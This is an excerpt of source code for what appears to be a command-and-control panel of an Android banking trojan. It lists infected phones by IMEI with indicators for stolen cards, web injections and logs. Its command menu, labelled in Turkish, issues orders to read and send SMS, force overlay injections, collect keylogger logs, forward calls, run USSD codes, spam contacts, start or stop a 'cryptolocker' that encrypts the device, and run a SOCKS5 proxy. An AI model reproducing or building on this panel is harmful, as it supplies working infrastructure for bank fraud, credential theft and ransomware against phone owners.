...
<div class="content" style="background: rgba(46, 45, 44, 0.7);border-radius:0;box-shadow:0px 0px 2px #ffc20e;" id="content">
...
function getTextFileLogs(imei){
	...
	$.ajax({
      ...
      success: function(data) {
         $('#textArea').append('<center><textarea style="border-radius:0;padding:10px;width:58%;outline:none;" id="logsTextArea" readonly name="mesage"  wrap="virtual" class="textlog">'+data+'</textarea></center>');
      }
});
refreshIconLogBot(imei);
	...
	function sendDataCommand(){
		...
		checkOFF();
		if(statusAlert){
			startNatif('success','Command Executed!');
		}else{
...
function getOptSelectIMEISettings(imei){
 ...
 <?php
	 ...
	 }elseif($_SESSION['panel_right']=="traffic")
	 {
		...
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><i class='fa fa-leaf fa-lg'/></th>";
		}
...
<?php
		...
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<button type='submit' title='Add Сommand' onclick='getOptSelectIMEI()' name='add_commands' data-toggle='modal' data-target='.modal_command' style='outline:none;box-shadow:none;border-radius:0;margin-left:1.5%;width:60px;' class='btn btn-outline-warning'><i class='fa fa-bug'></i></button>";
		echo "<button type='submit' title='Delete' name='delete' style='outline:none;border-radius:0;margin-left:5px;box-shadow:none;' class='btn btn-outline-danger'><i class='fa fa-trash'></i></button>";
		echo "<button type='submit' title='Sorting' name='sorting' data-toggle='modal' data-target='.sorting' style='box-shadow:none;outline:none;border-radius:0;margin-left:5px;' class='btn btn-outline-secondary'><i class='fa fa-sort-amount-desc'></i></button>";
		echo "<button type='submit' title='Refresh' name='refresh' style='outline:none;border-radius:0;margin-left:5px;box-shadow:none;' class='btn btn-outline-secondary'><i class='fa fa-refresh'></i></button>";
		}else
		{
			echo "<button type='submit' title='Refresh' name='refresh' style='margin-left:5px;outline:none;' class='btn btn-outline-secondary'><i class='fa fa-refresh'></i></button>";
		}
		echo "<br>";
		...
		foreach($statement as $row)
		{
			...
			if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
				...
				<td>$firstConnect</td>
				<td>
				<a title='Cards'><img id='cards$IMEI' src=$icon_bank width='18px'/></a>
				<a title='Injections'><img id='inj$IMEI' src=$icon_inj width='20px'/></a>
			    <button class='btn_log' onclick='getTextFileLogs(\"$IMEI\")' data-toggle='modal' data-target='.logs' style='background: transparent;' name='click_log' value='$IMEI' title='Logs' ><img id='logs$IMEI' src='$icon_log' title='Logs' alt='img' width='17px' class='img_log'/></button>
				&nbsp;<button class='btn_log' onclick='getOptSelectIMEISettings(\"$IMEI\");'data-toggle='modal' data-target='.settings' style='background: transparent;' name='click_set' value='$IMEI' title='Settings' ><img src='images/icons/fe.png' title='Settings' alt='img' width='18px' class='img_log'/></button>
				</td>
				</tr>";
...
<div  class="modal fade modal_command" style="Height: 390px; Width: 340px; background: #1D1F24;	margin: 0px auto auto -180px;	padding: 10px;	border-radius: 5px;" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
	  ...
	  <button type="button"  style="font-family:Montserrat;margin-top:-10px; color:#fff" onclick='checkOFF()' class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<div class="styled-select">
			...
			Commands
				<select  name="comboBox_commands" id="comboBox_commands" onchange="showOption(this)" style='color: #337ab7; font-size: 13; height: 28px; background: #1D1F24'>
					<option value='null'>
</option> <option value = "sentSMS"> SMS gönder
</option> <option value = "startApp"> Uygulamayı başlat
</option> <option value = "startinj"> İNJ GÖNDER ZORLA
</option> <option value = "getSMS"> Tüm SMS'leri al
</option> <option value = "getapps"> Yüklü tüm uygulamaları al
</option> <option value = "startAlert"> Ekranda Mesaj Göster
</option> <option value = "startAutoPush"> Otomatik Anlık Bildirimi Göster
</option> <option value = "startforward"> Çağrı yönlendirmeyi başlat
</option> <option value = "stopforward"> Çağrı yönlendirmeyi durdur
</option> <option value = "recordsound"> Uygulama Sil
</option> <option value = "replaceURL"> URL Yönetici Panelini Değiştir / Yönlendir
</option> <option value = "startUSSD"> USSD'yi başlat
</option> <option value = "getpermissions"> Alınan izinlerin listesi
</option> <option value = "getkeylogger"> Keylogger Günlüklerini Al
</option> <option value = "numberGO"> Telefon rehberinden numara alma
</option> <option value = "numberGOsendSMS"> Kişilerinize SMS gönderin
</option> <option value = "startPush"> Anlık Bildirimi Göster
</option> <option value = "cryptolocker"> Bir şifreleme makinesi başlatın
</option> <option value = "decryptolocker"> Şifreleyiciyi devre dışı bırak
</option> <option value = "spamsms"> Spam SMS çalıştır
</option> <option value = "RequestPermissionInj"> Enjeksiyonlar için izin iste
</option> <option value = "RequestPermissionGPS"> Coğrafi Konum için izin iste
</option> <option value = "startaccessibility"> Erişilebilirlik Hizmetini Başlat
</option> <option value = "startpermission"> İzini Başlat
</option> <option value = "openbrowser"> Bağlantıyı Tarayıcıda Aç
</option> <option value = "openactivity"> Bağlantıyı Faliyette Aç
</option> <option value = "startsocks5"> Socks5 Başlat
</option> <option value = "stopsocks5"> Socks5 Durdur
</option> <option value = "getIP"> Bir botun IP'sini al
</option> <option value = "killBot"> Botu öldür</option> 
				</select>
...
<div class="modal fade logs" id = "log_modal"  style="margin-left:0px;">
	<div id = "modal_l">
	<a id="exit" data-dismiss="modal" aria-hidden="true" onclick="document.getElementById('logsTextArea').remove();" style="margin-left:65%; cursor: pointer; color: Red;font-family:Montserrat;background:#000;">[ Close ]</a>
	...
	<button type="button"  style="font-family:Montserrat;margin-top:-10px; color:#fff" class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<div class="styled-select">
